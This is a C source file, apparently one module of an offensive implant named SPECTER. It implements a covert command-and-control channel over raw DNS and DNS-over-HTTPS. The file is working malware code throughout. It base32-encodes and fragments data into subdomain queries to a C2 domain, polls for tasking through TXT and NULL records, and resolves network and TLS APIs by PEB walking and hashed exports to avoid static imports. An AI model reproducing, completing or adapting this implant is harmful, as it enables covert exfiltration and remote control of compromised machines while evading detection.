/**
 * SPECTER Implant — DNS/DoH Communications Channel
 *
 * Raw DNS queries over UDP (port 53) with data encoded in subdomain
 * labels, and DNS-over-HTTPS (DoH) via HTTPS POST.  Responses carry
 * data in TXT and NULL records.  All network I/O through PEB-resolved
 * APIs — no static imports.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "comms_dns.h"

/* ------------------------------------------------------------------ */
/*  Static state                                                       */
/* ------------------------------------------------------------------ */

static DNS_CONTEXT g_dns_ctx;

/* ------------------------------------------------------------------ */
/*  Internal helpers                                                   */
/* ------------------------------------------------------------------ */

static void store16_be(BYTE *p, WORD v) {
    p[0] = (BYTE)(v >> 8);
    p[1] = (BYTE)(v);
}

static WORD load16_be(const BYTE *p) {
    return (WORD)((WORD)p[0] << 8 | (WORD)p[1]);
}

__attribute__((unused))
static void store32_le_dns(BYTE *p, DWORD v) {
    p[0] = (BYTE)(v);
    p[1] = (BYTE)(v >> 8);
    p[2] = (BYTE)(v >> 16);
    p[3] = (BYTE)(v >> 24);
}

static DWORD uint_to_str_dns(DWORD val, char *buf, DWORD buf_size) {
    if (buf_size == 0) return 0;
    char tmp[12];
    DWORD len = 0;
    if (val == 0) {
        if (buf_size < 2) return 0;
        buf[0] = '0'; buf[1] = '\0'; return 1;
    }
    while (val > 0 && len < sizeof(tmp)) {
        tmp[len++] = '0' + (char)(val % 10);
        val /= 10;
    }
    if (len >= buf_size) return 0;
    for (DWORD i = 0; i < len; i++)
        buf[i] = tmp[len - 1 - i];
    buf[len] = '\0';
    return len;
}

/* Simple PRNG (xorshift32) for TXID randomization */
static DWORD dns_prng_next(DNS_CONTEXT *ctx) {
    DWORD x = ctx->prng_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    ctx->prng_state = x;
    return x;
}

/* ------------------------------------------------------------------ */
/*  Base32 encoding/decoding (RFC 4648, lowercase, no padding)         */
/* ------------------------------------------------------------------ */

static const char b32_alphabet[] = DNS_BASE32_ALPHABET;

DWORD dns_base32_encode(const BYTE *data, DWORD data_len,
                        char *output, DWORD output_len) {
    if (!data || !output || output_len == 0)
        return 0;

    DWORD out_pos = 0;
    DWORD i = 0;

    while (i < data_len) {
        DWORD remaining = data_len - i;
        BYTE b0 = data[i];
        BYTE b1 = (remaining > 1) ? data[i + 1] : 0;
        BYTE b2 = (remaining > 2) ? data[i + 2] : 0;
        BYTE b3 = (remaining > 3) ? data[i + 3] : 0;
        BYTE b4 = (remaining > 4) ? data[i + 4] : 0;

        /* Number of output chars for this group */
        DWORD n_chars;
        if (remaining >= 5) n_chars = 8;
        else if (remaining == 4) n_chars = 7;
        else if (remaining == 3) n_chars = 5;
        else if (remaining == 2) n_chars = 4;
        else n_chars = 2;

        if (out_pos + n_chars >= output_len)
            break;

        BYTE c[8];
        c[0] = (b0 >> 3) & 0x1F;
        c[1] = ((b0 << 2) | (b1 >> 6)) & 0x1F;
        c[2] = (b1 >> 1) & 0x1F;
        c[3] = ((b1 << 4) | (b2 >> 4)) & 0x1F;
        c[4] = ((b2 << 1) | (b3 >> 7)) & 0x1F;
        c[5] = (b3 >> 2) & 0x1F;
        c[6] = ((b3 << 3) | (b4 >> 5)) & 0x1F;
        c[7] = b4 & 0x1F;

        for (DWORD j = 0; j < n_chars; j++)
            output[out_pos++] = b32_alphabet[c[j]];

        i += (remaining >= 5) ? 5 : remaining;
    }

    output[out_pos] = '\0';
    return out_pos;
}

DWORD dns_base32_decode(const char *input, DWORD input_len,
                        BYTE *output, DWORD output_len) {
    if (!input || !output || output_len == 0)
        return 0;

    /* Build reverse lookup (a=0, b=1, ... z=25, 2=26, 3=27, ... 7=31) */
    BYTE rev[128];
    spec_memset(rev, 0xFF, sizeof(rev));
    for (int i = 0; i < 26; i++)
        rev['a' + i] = (BYTE)i;
    for (int i = 0; i < 6; i++)
        rev['2' + i] = (BYTE)(26 + i);
    /* Also accept uppercase */
    for (int i = 0; i < 26; i++)
        rev['A' + i] = (BYTE)i;

    DWORD out_pos = 0;
    DWORD i = 0;

    while (i < input_len) {
        /* Collect up to 8 base32 characters */
        BYTE vals[8];
        DWORD n = 0;
        spec_memset(vals, 0, sizeof(vals));

        while (n < 8 && i < input_len) {
            BYTE c = (BYTE)input[i];
            if (c >= 128 || rev[c] == 0xFF) {
                i++;
                continue; /* skip invalid chars */
            }
            vals[n++] = rev[c];
            i++;
        }

        if (n == 0) break;

        /* Decode group */
        DWORD n_bytes;
        if (n >= 8) n_bytes = 5;
        else if (n >= 7) n_bytes = 4;
        else if (n >= 5) n_bytes = 3;
        else if (n >= 4) n_bytes = 2;
        else n_bytes = 1;

        if (out_pos + n_bytes > output_len)
            break;

        if (n_bytes >= 1) output[out_pos++] = (vals[0] << 3) | (vals[1] >> 2);
        if (n_bytes >= 2) output[out_pos++] = (vals[1] << 6) | (vals[2] << 1) | (vals[3] >> 4);
        if (n_bytes >= 3) output[out_pos++] = (vals[3] << 4) | (vals[4] >> 1);
        if (n_bytes >= 4) output[out_pos++] = (vals[4] << 7) | (vals[5] << 2) | (vals[6] >> 3);
        if (n_bytes >= 5) output[out_pos++] = (vals[6] << 5) | vals[7];
    }

    return out_pos;
}

/* ------------------------------------------------------------------ */
/*  DNS wire format                                                    */
/* ------------------------------------------------------------------ */

WORD dns_generate_txid(DNS_CONTEXT *ctx) {
    DWORD r = dns_prng_next(ctx);
    ctx->txid_counter++;
    return (WORD)(r ^ ctx->txid_counter);
}

/**
 * Encode a domain name into DNS wire format (length-prefixed labels).
 * e.g. "foo.bar.com" -> \x03foo\x03bar\x03com\x00
 * Returns bytes written, or 0 on error.
 */
static DWORD dns_encode_name(const char *name, BYTE *out, DWORD out_len) {
    if (!name || !out || out_len < 2)
        return 0;

    DWORD pos = 0;
    const char *p = name;

    while (*p) {
        /* Find next dot or end */
        const char *dot = p;
        while (*dot && *dot != '.') dot++;

        DWORD label_len = (DWORD)(dot - p);
        if (label_len == 0 || label_len > DNS_MAX_LABEL_LEN)
            return 0;

        if (pos + 1 + label_len >= out_len)
            return 0;

        out[pos++] = (BYTE)label_len;
        spec_memcpy(out + pos, p, label_len);
        pos += label_len;

        p = (*dot == '.') ? dot + 1 : dot;
    }

    if (pos >= out_len) return 0;
    out[pos++] = 0; /* Root label */
    return pos;
}

DWORD dns_build_query(DNS_CONTEXT *ctx, const char *qname,
                      WORD qtype, BYTE *packet, DWORD packet_len) {
    if (!ctx || !qname || !packet || packet_len < DNS_HEADER_SIZE + 4)
        return 0;

    spec_memset(packet, 0, packet_len);

    /* Transaction ID */
    WORD txid = dns_generate_txid(ctx);
    store16_be(packet, txid);

    /* Flags: standard query, recursion desired */
    store16_be(packet + 2, DNS_FLAG_RD);

    /* QDCOUNT = 1 */
    store16_be(packet + 4, 1);

    /* ANCOUNT = 0, NSCOUNT = 0, ARCOUNT = 0 already zeroed */

    /* Encode QNAME */
    DWORD name_len = dns_encode_name(qname, packet + DNS_HEADER_SIZE,
                                     packet_len - DNS_HEADER_SIZE - 4);
    if (name_len == 0) return 0;

    DWORD pos = DNS_HEADER_SIZE + name_len;

    /* QTYPE */
    if (pos + 4 > packet_len) return 0;
    store16_be(packet + pos, qtype);
    pos += 2;

    /* QCLASS = IN */
    store16_be(packet + pos, DNS_CLASS_IN);
    pos += 2;

    return pos;
}

/* ------------------------------------------------------------------ */
/*  Subdomain encoding                                                 */
/* ------------------------------------------------------------------ */

DWORD dns_encode_subdomain(DNS_CONTEXT *ctx, const BYTE *data,
                           DWORD data_len, DWORD seq,
                           char *output, DWORD output_len) {
    if (!ctx || !output || output_len == 0)
        return 0;

    DWORD pos = 0;

    /* Encode data as base32 into first label(s) */
    if (data && data_len > 0) {
        /* Base32 encode: 5 bytes -> 8 chars, max label 63 chars
         * We can fit ~39 bytes of raw data per label (39*8/5 = 62.4 chars) */
        char b32_buf[256];
        DWORD b32_len = dns_base32_encode(data, data_len, b32_buf, sizeof(b32_buf));

        /* Split into labels of max DNS_MAX_LABEL_LEN chars */
        DWORD b32_pos = 0;
        while (b32_pos < b32_len) {
            DWORD chunk = b32_len - b32_pos;
            if (chunk > DNS_MAX_LABEL_LEN)
                chunk = DNS_MAX_LABEL_LEN;

            if (pos + chunk + 1 >= output_len)
                return 0;

            spec_memcpy(output + pos, b32_buf + b32_pos, chunk);
            pos += chunk;
            output[pos++] = '.';
            b32_pos += chunk;
        }
    }

    /* Sequence number label */
    char seq_str[12];
    DWORD seq_len = uint_to_str_dns(seq, seq_str, sizeof(seq_str));
    if (pos + seq_len + 1 >= output_len)
        return 0;
    spec_memcpy(output + pos, seq_str, seq_len);
    pos += seq_len;
    output[pos++] = '.';

    /* Session ID label */
    DWORD sid_len = (DWORD)spec_strlen(ctx->session_id);
    if (pos + sid_len + 1 >= output_len)
        return 0;
    spec_memcpy(output + pos, ctx->session_id, sid_len);
    pos += sid_len;
    output[pos++] = '.';

    /* C2 domain suffix */
    DWORD domain_len = (DWORD)spec_strlen(ctx->c2_domain);
    if (pos + domain_len >= output_len)
        return 0;
    spec_memcpy(output + pos, ctx->c2_domain, domain_len);
    pos += domain_len;
    output[pos] = '\0';

    /* Validate total length */
    if (pos > DNS_MAX_NAME_LEN)
        return 0;

    return pos;
}

/* ------------------------------------------------------------------ */
/*  DNS response parsing                                               */
/* ------------------------------------------------------------------ */

/**
 * Skip over a DNS name in a packet (handles compression pointers).
 * Returns new offset after the name, or 0 on error.
 */
static DWORD dns_skip_name(const BYTE *packet, DWORD packet_len, DWORD offset) {
    if (offset >= packet_len) return 0;

    DWORD pos = offset;
    BOOL jumped = FALSE;

    while (pos < packet_len) {
        BYTE label_len = packet[pos];

        if (label_len == 0) {
            /* End of name */
            if (!jumped) pos++;
            return pos;
        }

        if ((label_len & 0xC0) == 0xC0) {
            /* Compression pointer — 2 bytes */
            if (!jumped) pos += 2;
            return pos;
        }

        pos += 1 + label_len;
    }

    return 0; /* Malformed */
}

DWORD dns_parse_response(const BYTE *packet, DWORD packet_len,
                         BYTE *data_out, DWORD data_out_len) {
    if (!packet || packet_len < DNS_HEADER_SIZE || !data_out)
        return 0;

    /* Check QR bit (must be response) */
    WORD flags = load16_be(packet + 2);
    if (!(flags & DNS_FLAG_QR))
        return 0;

    /* Check RCODE (lower 4 bits of flags) */
    if ((flags & 0x000F) != 0)
        return 0; /* Non-zero RCODE = error */

    WORD qdcount = load16_be(packet + 4);
    WORD ancount = load16_be(packet + 6);

    if (ancount == 0)
        return 0;

    /* Skip question section */
    DWORD pos = DNS_HEADER_SIZE;
    for (WORD q = 0; q < qdcount; q++) {
        pos = dns_skip_name(packet, packet_len, pos);
        if (pos == 0 || pos + 4 > packet_len) return 0;
        pos += 4; /* QTYPE + QCLASS */
    }

    /* Parse answer records, extract TXT and NULL data */
    DWORD out_pos = 0;

    for (WORD a = 0; a < ancount; a++) {
        pos = dns_skip_name(packet, packet_len, pos);
        if (pos == 0 || pos + 10 > packet_len) return 0;

        WORD rtype = load16_be(packet + pos);
        pos += 2;
        /* WORD rclass = load16_be(packet + pos); */
        pos += 2;
        /* DWORD ttl */
        pos += 4;
        WORD rdlength = load16_be(packet + pos);
        pos += 2;

        if (pos + rdlength > packet_len) return 0;

        if (rtype == DNS_TYPE_TXT) {
            /* TXT record: one or more <length><string> pairs */
            DWORD txt_pos = pos;
            DWORD txt_end = pos + rdlength;
            while (txt_pos < txt_end) {
                BYTE txt_len = packet[txt_pos++];
                if (txt_pos + txt_len > txt_end) break;
                if (out_pos + txt_len > data_out_len) break;
                spec_memcpy(data_out + out_pos, packet + txt_pos, txt_len);
                out_pos += txt_len;
                txt_pos += txt_len;
            }
        } else if (rtype == DNS_TYPE_NULL) {
            /* NULL record: raw binary data */
            if (out_pos + rdlength <= data_out_len) {
                spec_memcpy(data_out + out_pos, packet + pos, rdlength);
                out_pos += rdlength;
            }
        }

        pos += rdlength;
    }

    return out_pos;
}

/* ------------------------------------------------------------------ */
/*  API resolution                                                     */
/* ------------------------------------------------------------------ */

static NTSTATUS dns_resolve_apis(DNS_API *api) {
    if (api->resolved)
        return STATUS_SUCCESS;

    PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
    if (!ws2) return STATUS_PROCEDURE_NOT_FOUND;

    api->pWSAStartup   = (fn_WSAStartup)find_export_by_hash(ws2, HASH_WSASTARTUP);
    api->pSocket       = (fn_socket)find_export_by_hash(ws2, HASH_SOCKET);
    api->pClosesocket  = (fn_closesocket)find_export_by_hash(ws2, HASH_CLOSESOCKET);
    api->pGetaddrinfo  = (fn_getaddrinfo)find_export_by_hash(ws2, HASH_GETADDRINFO);
    api->pFreeaddrinfo = (fn_freeaddrinfo)find_export_by_hash(ws2, HASH_FREEADDRINFO);
    api->pSendto       = (fn_sendto)find_export_by_hash(ws2, HASH_SENDTO);
    api->pRecvfrom     = (fn_recvfrom)find_export_by_hash(ws2, HASH_RECVFROM);
    api->pConnect      = (fn_connect)find_export_by_hash(ws2, HASH_CONNECT);
    api->pSend         = (fn_send)find_export_by_hash(ws2, HASH_SEND);
    api->pRecv         = (fn_recv)find_export_by_hash(ws2, HASH_RECV);

    if (!api->pWSAStartup || !api->pSocket || !api->pClosesocket ||
        !api->pGetaddrinfo || !api->pFreeaddrinfo ||
        !api->pSendto || !api->pRecvfrom)
        return STATUS_PROCEDURE_NOT_FOUND;

    /* Resolve SChannel for DoH support */
    PVOID sec = find_module_by_hash(HASH_SECUR32_DLL);
    if (!sec)
        sec = find_module_by_hash(HASH_SSPICLI_DLL);
    if (sec) {
        api->pAcquireCredentialsHandleA  = (fn_AcquireCredentialsHandleA)find_export_by_hash(sec, HASH_ACQUIRECREDHANDLE);
        api->pInitializeSecurityContextA = (fn_InitializeSecurityContextA)find_export_by_hash(sec, HASH_INITSECCTX);
        api->pDeleteSecurityContext      = (fn_DeleteSecurityContext)find_export_by_hash(sec, HASH_DELETESECCTX);
        api->pFreeCredentialsHandle      = (fn_FreeCredentialsHandle)find_export_by_hash(sec, HASH_FREECREDHANDLE);
        api->pEncryptMessage             = (fn_EncryptMessage)find_export_by_hash(sec, HASH_ENCRYPTMSG);
        api->pDecryptMessage             = (fn_DecryptMessage)find_export_by_hash(sec, HASH_DECRYPTMSG);
        api->pQueryContextAttributesA    = (fn_QueryContextAttributesA)find_export_by_hash(sec, HASH_QUERYSECCTXATTR);
        api->pFreeContextBuffer          = (fn_FreeContextBuffer)find_export_by_hash(sec, HASH_FREECTXBUFFER);
        api->pApplyControlToken          = (fn_ApplyControlToken)find_export_by_hash(sec, HASH_APPLYCTRLTOKEN);
    }

    api->resolved = TRUE;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  UDP DNS send/receive                                               */
/* ------------------------------------------------------------------ */

static NTSTATUS dns_udp_send_query(DNS_CONTEXT *ctx, const BYTE *packet,
                                    DWORD packet_len) {
    int sent = ctx->api.pSendto(ctx->socket, (const char *)packet,
                                 (int)packet_len, 0,
                                 &ctx->server_addr, ctx->server_addr_len);
    if (sent <= 0)
        return STATUS_UNSUCCESSFUL;
    return STATUS_SUCCESS;
}

static NTSTATUS dns_udp_recv_response(DNS_CONTEXT *ctx, BYTE *buf,
                                       DWORD buf_len, DWORD *received) {
    int from_len = ctx->server_addr_len;
    SOCKADDR from_addr;
    int n = ctx->api.pRecvfrom(ctx->socket, (char *)buf, (int)buf_len,
                                0, &from_addr, &from_len);
    if (n <= 0) {
        *received = 0;
        return STATUS_UNSUCCESSFUL;
    }
    *received = (DWORD)n;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  DoH (DNS-over-HTTPS) transport                                     */
/* ------------------------------------------------------------------ */

/**
 * Send a DNS query via DoH (HTTPS POST to resolver).
 * Uses the existing TLS infrastructure from comms.h.
 */
static NTSTATUS dns_doh_query(DNS_CONTEXT *ctx, const BYTE *dns_packet,
                               DWORD dns_len, BYTE *response,
                               DWORD response_len, DWORD *response_received) {
    COMMS_CONTEXT *tls = &ctx->doh_tls;

    /* Ensure TLS APIs are wired up */
    if (!tls->api.resolved) {
        tls->api.pWSAStartup = ctx->api.pWSAStartup;
        tls->api.pSocket = ctx->api.pSocket;
        tls->api.pConnect = ctx->api.pConnect;
        tls->api.pSend = ctx->api.pSend;
        tls->api.pRecv = ctx->api.pRecv;
        tls->api.pClosesocket = ctx->api.pClosesocket;
        tls->api.pGetaddrinfo = ctx->api.pGetaddrinfo;
        tls->api.pFreeaddrinfo = ctx->api.pFreeaddrinfo;
        tls->api.pAcquireCredentialsHandleA = ctx->api.pAcquireCredentialsHandleA;
        tls->api.pInitializeSecurityContextA = ctx->api.pInitializeSecurityContextA;
        tls->api.pDeleteSecurityContext = ctx->api.pDeleteSecurityContext;
        tls->api.pFreeCredentialsHandle = ctx->api.pFreeCredentialsHandle;
        tls->api.pEncryptMessage = ctx->api.pEncryptMessage;
        tls->api.pDecryptMessage = ctx->api.pDecryptMessage;
        tls->api.pQueryContextAttributesA = ctx->api.pQueryContextAttributesA;
        tls->api.pFreeContextBuffer = ctx->api.pFreeContextBuffer;
        tls->api.pApplyControlToken = ctx->api.pApplyControlToken;
        tls->api.resolved = TRUE;
        tls->wsa_initialized = ctx->wsa_initialized;
    }

    /* Extract hostname from resolver URL for TLS SNI */
    /* doh_resolver format: "hostname" or "hostname:port" */
    char hostname[256];
    DWORD port = 443;
    spec_memset(hostname, 0, sizeof(hostname));

    const char *src = ctx->doh_resolver;
    DWORD hi = 0;
    while (*src && *src != ':' && hi < sizeof(hostname) - 1)
        hostname[hi++] = *src++;
    hostname[hi] = '\0';

    if (*src == ':') {
        src++;
        port = 0;
        while (*src >= '0' && *src <= '9') {
            port = port * 10 + (*src - '0');
            src++;
        }
    }

    /* Connect if not already connected */
    if (tls->state < COMMS_STATE_TLS_CONNECTED) {
        NTSTATUS ns = comms_tcp_connect(tls, hostname, port);
        if (!NT_SUCCESS(ns)) return ns;

        ns = comms_tls_init(tls);
        if (!NT_SUCCESS(ns)) {
            comms_tcp_close(tls);
            return ns;
        }

        ns = comms_tls_handshake(tls, hostname);
        if (!NT_SUCCESS(ns)) {
            comms_tcp_close(tls);
            return ns;
        }
    }

    /* Build HTTP POST for DoH */
    char content_len_str[12];
    uint_to_str_dns(dns_len, content_len_str, sizeof(content_len_str));

    BYTE http_buf[1024];
    DWORD http_len = comms_http_build_request(
        COMMS_HTTP_POST, "/dns-query",
        hostname,
        "Content-Type: application/dns-message\r\n"
        "Accept: application/dns-message\r\n",
        dns_packet, dns_len,
        http_buf, sizeof(http_buf));

    if (http_len == 0) return STATUS_UNSUCCESSFUL;

    /* Send via TLS */
    NTSTATUS ns = comms_tls_send(tls, http_buf, http_len);
    if (!NT_SUCCESS(ns)) return ns;

    /* Receive response */
    BYTE recv_buf[4096];
    DWORD received = 0;
    ns = comms_tls_recv(tls, recv_buf, sizeof(recv_buf), &received);
    if (!NT_SUCCESS(ns)) return ns;

    /* Parse HTTP response to extract DNS message body */
    DWORD status_code = 0;
    const BYTE *body = NULL;
    DWORD body_len = 0;
    ns = comms_http_parse_response(recv_buf, received,
                                    &status_code, NULL, NULL, &body, &body_len);
    if (!NT_SUCCESS(ns) || status_code != 200)
        return STATUS_UNSUCCESSFUL;

    if (body && body_len > 0 && body_len <= response_len) {
        spec_memcpy(response, body, body_len);
        *response_received = body_len;
    } else {
        *response_received = 0;
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Fragmentation — send side                                          */
/* ------------------------------------------------------------------ */

/**
 * Send a single fragment as a DNS query.
 * Returns STATUS_SUCCESS on successful send+receive.
 */
static NTSTATUS dns_send_fragment(DNS_CONTEXT *ctx, const BYTE *data,
                                   DWORD data_len, DWORD seq,
                                   DWORD total_frags) {
    /* Build subdomain-encoded query name */
    char qname[DNS_MAX_NAME_LEN + 1];

    /* Prepend total fragment count to data for first fragment */
    BYTE frag_data[DNS_FRAGMENT_DATA_SIZE + 8];
    DWORD frag_data_len = 0;

    if (seq == 0) {
        /* First fragment includes: [total_frags:1 byte][data] */
        frag_data[0] = (BYTE)total_frags;
        if (data_len > 0)
            spec_memcpy(frag_data + 1, data, data_len);
        frag_data_len = 1 + data_len;
    } else {
        if (data_len > 0)
            spec_memcpy(frag_data, data, data_len);
        frag_data_len = data_len;
    }

    DWORD qname_len = dns_encode_subdomain(ctx, frag_data, frag_data_len,
                                            seq, qname, sizeof(qname));
    if (qname_len == 0)
        return STATUS_UNSUCCESSFUL;

    /* Build DNS query packet */
    BYTE packet[DNS_MAX_PACKET_SIZE];
    DWORD pkt_len = dns_build_query(ctx, qname, DNS_TYPE_TXT,
                                     packet, sizeof(packet));
    if (pkt_len == 0)
        return STATUS_UNSUCCESSFUL;

    /* Send query */
    if (ctx->mode == DNS_MODE_DOH) {
        BYTE resp[DNS_MAX_PACKET_SIZE];
        DWORD resp_len = 0;
        return dns_doh_query(ctx, packet, pkt_len, resp, sizeof(resp), &resp_len);
    }

    return dns_udp_send_query(ctx, packet, pkt_len);
}

/* ------------------------------------------------------------------ */
/*  Channel interface implementation                                   */
/* ------------------------------------------------------------------ */

NTSTATUS dns_connect(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config) return STATUS_INVALID_PARAMETER;

    DNS_CONTEXT *dns = &g_dns_ctx;
    spec_memset(dns, 0, sizeof(*dns));
    dns->socket = INVALID_SOCKET;
    dns->doh_tls.socket = INVALID_SOCKET;

    /* Seed PRNG from implant pubkey */
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    dns->prng_state = (DWORD)cfg->implant_pubkey[0] |
                      ((DWORD)cfg->implant_pubkey[1] << 8) |
                      ((DWORD)cfg->implant_pubkey[2] << 16) |
                      ((DWORD)cfg->implant_pubkey[3] << 24);
    if (dns->prng_state == 0) dns->prng_state = 0xDEADBEEF;

    /* Find DNS channel config */
    CHANNEL_CONFIG *ch = NULL;
    for (DWORD i = 0; i < cfg->channel_count; i++) {
        if (cfg->channels[i].type == CHANNEL_DNS && cfg->channels[i].active) {
            ch = &cfg->channels[i];
            break;
        }
    }
    if (!ch) return STATUS_OBJECT_NAME_NOT_FOUND;

    /* Copy C2 domain from URL field */
    spec_memcpy(dns->c2_domain, ch->url, spec_strlen(ch->url) + 1);

    /* Generate session ID from implant pubkey hash */
    {
        BYTE hash[SHA256_DIGEST_SIZE];
        spec_sha256(cfg->implant_pubkey, 32, hash);
        static const char hex[] = "0123456789abcdef";
        for (int i = 0; i < DNS_SESSION_ID_LEN / 2; i++) {
            dns->session_id[i * 2]     = hex[(hash[i] >> 4) & 0x0F];
            dns->session_id[i * 2 + 1] = hex[hash[i] & 0x0F];
        }
        dns->session_id[DNS_SESSION_ID_LEN] = '\0';
        spec_memset(hash, 0, sizeof(hash));
    }

    /* Copy session key */
    spec_memcpy(dns->session_key, cfg->teamserver_pubkey, 32);

    /* Resolve APIs */
    NTSTATUS status = dns_resolve_apis(&dns->api);
    if (!NT_SUCCESS(status)) return status;

    /* Initialize Winsock */
    if (!dns->wsa_initialized) {
        WSADATA wsa;
        int err = dns->api.pWSAStartup(0x0202, &wsa);
        if (err != 0) return STATUS_UNSUCCESSFUL;
        dns->wsa_initialized = TRUE;
    }

    /* Determine mode: if port != 53, assume DoH */
    if (ch->port != 53) {
        dns->mode = DNS_MODE_DOH;
        spec_memcpy(dns->doh_resolver, ch->url, spec_strlen(ch->url) + 1);
    } else {
        dns->mode = DNS_MODE_UDP;

        /* Create UDP socket */
        ULONG_PTR sock = dns->api.pSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET)
            return STATUS_UNSUCCESSFUL;
        dns->socket = sock;

        /* Resolve DNS server address (use 8.8.8.8 as fallback) */
        char port_str[8];
        uint_to_str_dns(53, port_str, sizeof(port_str));

        ADDRINFO hints;
        spec_memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_DGRAM;
        hints.ai_protocol = IPPROTO_UDP;

        ADDRINFO *result = NULL;
        /* Use 8.8.8.8 as DNS server for queries */
        int ret = dns->api.pGetaddrinfo("8.8.8.8", port_str, &hints, &result);
        if (ret != 0 || !result) {
            dns->api.pClosesocket(dns->socket);
            dns->socket = INVALID_SOCKET;
            return STATUS_UNSUCCESSFUL;
        }

        spec_memcpy(&dns->server_addr, result->ai_addr, result->ai_addrlen);
        dns->server_addr_len = (int)result->ai_addrlen;
        dns->api.pFreeaddrinfo(result);
    }

    dns->state = COMMS_STATE_REGISTERED;
    return STATUS_SUCCESS;
}

NTSTATUS dns_send(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;

    DNS_CONTEXT *dns = &g_dns_ctx;
    if (dns->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* Calculate number of fragments needed */
    /* Each fragment can carry DNS_FRAGMENT_DATA_SIZE bytes of data */
    /* First fragment has 1 byte overhead for total_frags count */
    DWORD first_frag_capacity = DNS_FRAGMENT_DATA_SIZE - 1;
    DWORD total_frags;

    if (len <= first_frag_capacity) {
        total_frags = 1;
    } else {
        DWORD remaining = len - first_frag_capacity;
        total_frags = 1 + (remaining + DNS_FRAGMENT_DATA_SIZE - 1) / DNS_FRAGMENT_DATA_SIZE;
    }

    if (total_frags > DNS_MAX_FRAGMENTS)
        return STATUS_BUFFER_TOO_SMALL;

    /* Send each fragment */
    DWORD data_offset = 0;
    for (DWORD frag = 0; frag < total_frags; frag++) {
        DWORD chunk_size;
        if (frag == 0) {
            chunk_size = (len < first_frag_capacity) ? len : first_frag_capacity;
        } else {
            DWORD remaining = len - data_offset;
            chunk_size = (remaining < DNS_FRAGMENT_DATA_SIZE) ? remaining : DNS_FRAGMENT_DATA_SIZE;
        }

        NTSTATUS status = dns_send_fragment(dns, data + data_offset,
                                             chunk_size, frag, total_frags);
        if (!NT_SUCCESS(status))
            return status;

        data_offset += chunk_size;
        dns->send_seq++;
    }

    return STATUS_SUCCESS;
}

NTSTATUS dns_recv(IMPLANT_CONTEXT *ctx, BYTE *data_out, DWORD *data_len) {
    if (!ctx || !data_out || !data_len || *data_len == 0)
        return STATUS_INVALID_PARAMETER;

    DNS_CONTEXT *dns = &g_dns_ctx;
    if (dns->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* Send a poll query (empty data, seq=0) with NULL record type
     * to request pending data from the server */
    char qname[DNS_MAX_NAME_LEN + 1];
    DWORD qname_len = dns_encode_subdomain(dns, NULL, 0, dns->send_seq,
                                            qname, sizeof(qname));
    if (qname_len == 0) return STATUS_UNSUCCESSFUL;

    BYTE packet[DNS_MAX_PACKET_SIZE];
    DWORD pkt_len = dns_build_query(dns, qname, DNS_TYPE_NULL,
                                     packet, sizeof(packet));
    if (pkt_len == 0) return STATUS_UNSUCCESSFUL;

    BYTE response[DNS_RECV_BUF_SIZE];
    DWORD resp_len = 0;

    if (dns->mode == DNS_MODE_DOH) {
        NTSTATUS ns = dns_doh_query(dns, packet, pkt_len,
                                     response, sizeof(response), &resp_len);
        if (!NT_SUCCESS(ns)) return ns;
    } else {
        NTSTATUS ns = dns_udp_send_query(dns, packet, pkt_len);
        if (!NT_SUCCESS(ns)) return ns;

        ns = dns_udp_recv_response(dns, response, sizeof(response), &resp_len);
        if (!NT_SUCCESS(ns)) return ns;
    }

    /* Parse DNS response to extract data */
    DWORD extracted = dns_parse_response(response, resp_len,
                                          data_out, *data_len);
    *data_len = extracted;

    if (extracted == 0)
        return STATUS_UNSUCCESSFUL;

    dns->send_seq++;
    return STATUS_SUCCESS;
}

NTSTATUS dns_disconnect(IMPLANT_CONTEXT *ctx) {
    (void)ctx;
    DNS_CONTEXT *dns = &g_dns_ctx;

    if (dns->mode == DNS_MODE_DOH) {
        if (dns->doh_tls.state >= COMMS_STATE_TLS_CONNECTED)
            comms_tls_close(&dns->doh_tls);
    }

    if (dns->socket != 0 && dns->socket != INVALID_SOCKET) {
        dns->api.pClosesocket(dns->socket);
        dns->socket = INVALID_SOCKET;
    }

    dns->state = COMMS_STATE_DISCONNECTED;
    spec_memset(dns->session_key, 0, sizeof(dns->session_key));
    return STATUS_SUCCESS;
}

NTSTATUS dns_health_check(IMPLANT_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    DNS_CONTEXT *dns = &g_dns_ctx;
    if (dns->state < COMMS_STATE_REGISTERED)
        return STATUS_UNSUCCESSFUL;

    /* Send a simple A record query for the C2 domain */
    BYTE packet[DNS_MAX_PACKET_SIZE];
    DWORD pkt_len = dns_build_query(dns, dns->c2_domain, DNS_TYPE_A,
                                     packet, sizeof(packet));
    if (pkt_len == 0) return STATUS_UNSUCCESSFUL;

    if (dns->mode == DNS_MODE_DOH) {
        BYTE resp[DNS_MAX_PACKET_SIZE];
        DWORD resp_len = 0;
        return dns_doh_query(dns, packet, pkt_len, resp, sizeof(resp), &resp_len);
    }

    NTSTATUS ns = dns_udp_send_query(dns, packet, pkt_len);
    if (!NT_SUCCESS(ns)) return ns;

    BYTE resp[DNS_MAX_PACKET_SIZE];
    DWORD resp_len = 0;
    return dns_udp_recv_response(dns, resp, sizeof(resp), &resp_len);
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
DNS_CONTEXT *dns_get_context(void) {
    return &g_dns_ctx;
}

void dns_test_set_prng_seed(DNS_CONTEXT *ctx, DWORD seed) {
    if (ctx) ctx->prng_state = seed;
}
#endif
